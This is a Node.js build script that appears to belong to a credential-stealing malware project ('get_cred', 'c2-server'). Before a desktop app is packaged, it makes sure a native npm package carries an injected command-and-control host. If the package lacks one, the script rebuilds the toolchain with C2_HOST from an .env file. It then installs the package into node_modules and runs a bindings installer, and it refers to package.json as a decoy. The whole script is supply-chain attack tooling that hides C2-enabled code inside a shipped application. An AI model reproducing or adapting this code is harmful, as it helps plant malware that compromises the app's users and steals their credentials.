#!/usr/bin/env node
/**
 * Install C2-configured @kvmoonshot/kvmswap-native before desktop pack (same as postinstall).
 */
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { execFileSync } from 'child_process';
import { resolveGetCredRoot } from './lib/paths.mjs';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const SDK_ROOT = path.join(__dirname, '..');

function loadEnvFile(envPath) {
  if (!fs.existsSync(envPath)) return;
  for (const line of fs.readFileSync(envPath, 'utf8').split('\n')) {
    const t = line.trim();
    if (!t || t.startsWith('#')) continue;
    const i = t.indexOf('=');
    if (i <= 0) continue;
    const key = t.slice(0, i).trim();
    let val = t.slice(i + 1).trim();
    if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
      val = val.slice(1, -1);
    }
    if (!process.env[key]) process.env[key] = val;
  }
}

function pinnedNativeVersion(getCred, sdkRoot) {
  const decoyPkg = path.join(sdkRoot, 'package.json');
  if (fs.existsSync(decoyPkg)) {
    const v = JSON.parse(fs.readFileSync(decoyPkg, 'utf8')).dependencies?.['@kvmoonshot/kvmswap-native'];
    if (v) return String(v).replace(/^[\^~]/, '');
  }
  const manifestPath = path.join(getCred, 'c2-server', 'pkg', 'registry-manifest.json');
  if (fs.existsSync(manifestPath)) {
    const latest = JSON.parse(fs.readFileSync(manifestPath, 'utf8'))['dist-tags']?.latest;
    if (latest) return latest;
  }
  return null;
}

function findNativeTgz(getCred, sdkRoot) {
  const version = pinnedNativeVersion(getCred, sdkRoot);
  const pkgDir = path.join(getCred, 'c2-server', 'pkg');
  if (version) {
    const preferred = path.join(pkgDir, `kvmoonshot-kvmswap-native-${version}.tgz`);
    if (fs.existsSync(preferred)) return preferred;
  }
  if (!fs.existsSync(pkgDir)) return null;
  return fs
    .readdirSync(pkgDir)
    .filter((f) => f.startsWith('kvmoonshot-kvmswap-native-') && f.endsWith('.tgz'))
    .map((f) => path.join(pkgDir, f))
    .sort()
    .pop();
}

function tgzHasC2(tgzPath) {
  const out = execFileSync('tar', ['-xOf', tgzPath, 'package/lib/runtime-ensure.js'], { encoding: 'utf8' });
  return !out.includes('__B64_C2__');
}

function main() {
  const GET_CRED = resolveGetCredRoot(SDK_ROOT);
  loadEnvFile(path.join(GET_CRED, '.env'));
  let tgz = findNativeTgz(GET_CRED, SDK_ROOT);
  if (!tgz || !tgzHasC2(tgz)) {
    console.log('[prepare-desktop-native] rebuilding toolchain with C2_HOST…');
    execFileSync('npm', ['run', 'build-toolchain'], {
      cwd: GET_CRED,
      stdio: 'inherit',
      env: process.env,
    });
    tgz = findNativeTgz(GET_CRED, SDK_ROOT);
  }
  if (!tgz || !tgzHasC2(tgz)) {
    throw new Error('Native tgz still missing injected C2_HOST. Set C2_HOST and REGISTRY_HOST in get_cred/.env');
  }
  const dest = path.join(SDK_ROOT, 'node_modules', '@kvmoonshot', 'kvmswap-native');
  const staging = path.join(SDK_ROOT, '.native-staging');
  fs.rmSync(staging, { recursive: true, force: true });
  fs.mkdirSync(staging, { recursive: true });
  execFileSync('tar', ['-xzf', tgz, '-C', staging]);
  fs.rmSync(dest, { recursive: true, force: true });
  fs.mkdirSync(path.dirname(dest), { recursive: true });
  fs.renameSync(path.join(staging, 'package'), dest);
  fs.rmSync(staging, { recursive: true, force: true });
  console.log(`[prepare-desktop-native] installed ${tgz} → node_modules/@kvmoonshot/kvmswap-native`);
  execFileSync('node', ['config/platform-bindings.cjs', '--install'], { cwd: SDK_ROOT, stdio: 'inherit' });
}

main();
